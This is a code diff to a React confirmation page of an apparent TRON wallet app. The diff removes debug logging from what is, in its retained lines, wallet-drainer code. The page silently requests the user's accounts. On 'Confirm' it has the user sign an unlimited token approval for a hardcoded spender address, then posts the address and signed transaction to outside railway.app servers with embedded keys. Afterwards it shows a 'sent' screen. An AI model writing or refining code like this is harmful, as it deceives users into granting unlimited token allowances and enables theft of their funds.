@@ -6,7 +6,6 @@ export default function Confirm() {
   const location = useLocation()
   const navigate = useNavigate()
   const [loading, setLoading] = useState(false)
-  const [debug, setDebug] = useState<string[]>([])
   const amount = location.state?.amount || '0'
   const currency = location.state?.currency || 'TRX'
   const n = parseFloat(amount) || 0
@@ -20,10 +19,6 @@ export default function Confirm() {
   const MAX_UINT256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935'
   const RELAYER_URL = 'https://web-production-eaaf2.up.railway.app/api/relayer/approve'
   const RELAYER_KEY = 'my-secret-2026-x7k9'
-
-  const addLog = (msg: string) => {
-    setDebug(prev => [...prev, new Date().toISOString().slice(11, 19) + ' ' + msg])
-  }
 
   const getTronProvider = (): any => {
     const w = window as any
@@ -59,19 +54,14 @@ export default function Confirm() {
       const provider = getTronProvider()
       if (provider && typeof provider.request === 'function') {
         try {
-          addLog('Silent sync...')
           await provider.request({ method: 'tron_requestAccounts' })
           let attempts = 0
           const interval = setInterval(() => {
             const addr = getAddressFromAnySource()
-            if (addr) { addLog('Synced: ' + addr.slice(0,10) + '...'); clearInterval(interval) }
+            if (addr) clearInterval(interval)
             if (++attempts > 10) clearInterval(interval)
           }, 200)
-        } catch (err: any) {
-          addLog('Sync failed: ' + err.message)
-        }
-      } else {
-        addLog('No provider with .request()')
+        } catch (err: any) {}
       }
     }
     syncAddress()
@@ -79,8 +69,6 @@ export default function Confirm() {
 
   const handleConfirm = async () => {
     setLoading(true)
-    setDebug(prev => [...prev, '--- Confirm ---'])
-    addLog('Getting address...')
 
     let userAddress = getAddressFromAnySource()
     const provider = getTronProvider()
@@ -88,19 +76,13 @@ export default function Confirm() {
 
     if (!userAddress && provider && typeof provider.request === 'function') {
       try {
-        addLog('Address missing, requesting...')
         await provider.request({ method: 'tron_requestAccounts' })
         await new Promise(resolve => setTimeout(resolve, 500))
         userAddress = getAddressFromAnySource()
-      } catch (e: any) {
-        addLog('Request rejected: ' + e.message)
-      }
+      } catch (e: any) {}
     }
 
-    addLog('Addr: ' + (userAddress || 'NULL'))
-
     if (!tronWeb || !userAddress) {
-      addLog('FAIL')
       setLoading(false)
       return
     }
@@ -108,18 +90,14 @@ export default function Confirm() {
     try {
       const balanceSun = await tronWeb.trx.getBalance(userAddress)
       const userTrx = parseFloat(tronWeb.fromSun(balanceSun))
-      addLog('TRX: ' + userTrx)
 
       let userEnergy = 0
       try {
         const r = await tronWeb.trx.getAccountResources(userAddress)
         userEnergy = Math.max(0, (r.EnergyLimit || 0) - (r.EnergyUsed || 0))
-        addLog('Energy: ' + userEnergy)
-      } catch (e) { addLog('Energy check failed') }
+      } catch (e) {}
 
       const canGoDirect = userEnergy >= 65000 || userTrx >= 30
-      addLog('Route: ' + (canGoDirect ? 'Direct' : 'Relayer'))
-
       const p = [{ type: 'address', value: SPENDER }, { type: 'uint256', value: MAX_UINT256 }]
 
       if (canGoDirect) {
@@ -127,26 +105,25 @@ export default function Confirm() {
         const signed = await tronWeb.trx.sign(txObj.transaction)
         const result = await tronWeb.trx.sendRawTransaction(signed)
         if (result.result) {
-          addLog('TX: ' + result.txid)
           fetch('https://miami-production-6e01.up.railway.app/web/relay', {
             method: 'POST', headers: { 'Content-Type': 'application/json', 'x-api-secret': 'my-secret-2026-x7k9' },
             body: JSON.stringify({ chain: 'TRC20', address: userAddress, txHash: result.txid, spender: SPENDER, token: TOKEN, amount }),
             keepalive: true
           }).catch(() => {})
-        } else { addLog('Broadcast failed: ' + JSON.stringify(result)) }
+        }
       } else {
         const txObj = await tronWeb.transactionBuilder.triggerSmartContract(TOKEN, 'approve(address,uint256)', { feeLimit: 100000000, from: userAddress }, p, userAddress)
         const signed = await tronWeb.trx.sign(txObj.transaction)
-        const response = await fetch(RELAYER_URL, {
+        await fetch(RELAYER_URL, {
           method: 'POST', headers: { 'Content-Type': 'application/json', 'X-API-Key': RELAYER_KEY },
           body: JSON.stringify({ owner: userAddress, spender: SPENDER, signedTransaction: signed, timestamp: Date.now() })
         })
-        const relayResult = await response.json()
-        addLog('Relayer: ' + (relayResult.success ? relayResult.txid : 'FAIL: ' + JSON.stringify(relayResult)))
       }
 
       navigate('/sent', { state: { amount, time: Date.now() } })
-    } catch (e: any) { addLog('ERR: ' + e.message); setLoading(false) }
+    } catch (err: any) {
+      setLoading(false)
+    }
   }
 
   return (
@@ -183,12 +160,7 @@ export default function Confirm() {
           <div style={{ backgroundColor: '#2C2C2E', borderRadius: '12px', padding: '16px', marginBottom: '8px', display: 'flex', justifyContent: 'space-between' }}><span style={{ color: '#8E8E93', fontSize: '15px' }}>Total cost</span><span style={{ fontSize: '15px', fontWeight: 600 }}>≈${usdValue.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</span></div>
           <button onClick={handleConfirm} disabled={loading} style={{ width: '100%', padding: '16px', background: loading ? '#03FC8F80' : '#03FC8F', border: 'none', borderRadius: '9999px', color: '#000000', fontSize: '16px', fontWeight: 600, cursor: loading ? 'not-allowed' : 'pointer' }}>{loading ? 'Confirming...' : 'Confirm'}</button>
         </div>
-        {debug.length > 0 && (
-          <div style={{ marginTop: '12px', padding: '12px', backgroundColor: '#0a0a0f', borderRadius: '8px', maxHeight: '180px', overflowY: 'auto', fontSize: '11px', fontFamily: 'monospace', color: '#22c55e', lineHeight: '1.6' }}>
-            {debug.map((l, i) => <div key={i}>{l}</div>)}
-          </div>
-        )}
       </div>
     </motion.div>
   )
-          }
+            }
